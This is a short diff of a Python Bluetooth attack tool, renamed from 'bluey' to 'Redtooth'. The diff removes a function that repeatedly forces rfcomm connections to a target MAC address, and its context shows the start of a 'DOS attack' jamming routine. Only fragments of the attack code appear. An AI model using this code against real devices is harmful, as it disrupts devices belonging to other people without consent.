@@ -49,21 +49,6 @@ def scan():
         main()
         
 
-def force_connect(target):
-    if target == " ":
-        print("Target MAC not set")
-        main()
-
-    print("attempting connection")
-    connect=['rfcomm', 'connect', target, '1']
-    items = range(1001)
-    with alive_bar(len(items)) as bar:
-        for item in items:   
-            subprocess.call(connect)
-            bar()
-
-
-
 def jam(threads_count, packetsize):
    
     print("[*] Starting DOS attack in 3 seconds...")
@@ -103,7 +88,7 @@ def help_menu():
 
 def main():
     while True:
-        prompt = "\nbluey/> "
+        prompt = "\nRedtooth/> "
         print(prompt, end="")
 
         command = input().split(" ")
